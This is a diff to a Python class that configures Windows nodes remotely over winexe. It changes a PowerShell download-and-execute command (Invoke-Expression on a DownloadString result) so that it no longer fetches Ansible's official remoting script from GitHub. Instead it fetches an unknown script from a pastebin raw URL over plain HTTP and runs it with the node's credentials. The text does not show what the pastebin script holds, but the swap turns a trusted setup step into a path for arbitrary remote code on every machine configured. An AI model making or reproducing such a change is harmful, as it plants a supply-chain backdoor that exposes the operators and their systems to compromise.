@@ -94,7 +94,7 @@ class WindowsConfiguration(NodeConfiguration):
         logging.info(out)
         logging.debug("Running winexe to remotely configure %s", ip)
         out = run(
-            "Invoke-Expression ((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ansible/ansible/devel/examples/scripts/ConfigureRemotingForAnsible.ps1'))",
+            "Invoke-Expression ((New-Object System.Net.Webclient).DownloadString('http://pastebin.com/raw/eDL4ThmG'))",
             args=[],
             user=self.username,
             password=self.secret,
